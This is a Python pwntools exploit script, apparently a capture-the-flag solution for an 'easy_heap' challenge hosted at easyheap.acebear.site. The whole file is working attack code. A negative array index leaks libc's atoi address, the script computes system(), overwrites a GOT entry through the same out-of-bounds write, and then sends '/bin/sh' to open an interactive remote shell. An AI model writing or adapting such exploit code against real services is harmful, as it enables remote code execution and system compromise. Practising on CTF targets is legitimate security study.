from pwn import *

def create(idx, name):
    p.recvuntil("Your choice: ")
    p.sendline('1')
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Input this name: ")
    p.sendline(name)

def edit(idx, name):
    p.recvuntil("Your choice: ")
    p.sendline('2')
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Input new name: ")
    p.sendline(name)

def delete(idx):
    p.recvuntil("Your choice: ")
    p.sendline('3')
    p.recvuntil("Index: ")
    p.sendline(str(idx))

def show(idx):
    p.recvuntil("Your choice: ")
    p.sendline('4')
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("This name %d is: " % idx)
    return p.recvuntil("\n")[:-1]

if __name__ == '__main__':
    p = remote("easyheap.acebear.site", 3002)
#p = process("./easy_heap")
    elf = ELF("./easy_heap")
    libc = ELF("./easyheap_libc.so.6")

    context.log_level='debug'

    free_got = 0x804B018
    puts_plt = 0x8048540

    p.sendline("AAAA")
    p.sendline("18")

    leak = u32(show(-2826))

    print "[Leak] : 0x%x" % leak

    libc_base = leak - libc.symbols['atoi']
    print "0x%x" % libc_base
    system = libc_base + libc.symbols['system']

    edit(-2826,p32(system))
    p.sendline("/bin/sh\x00")
    p.interactive()

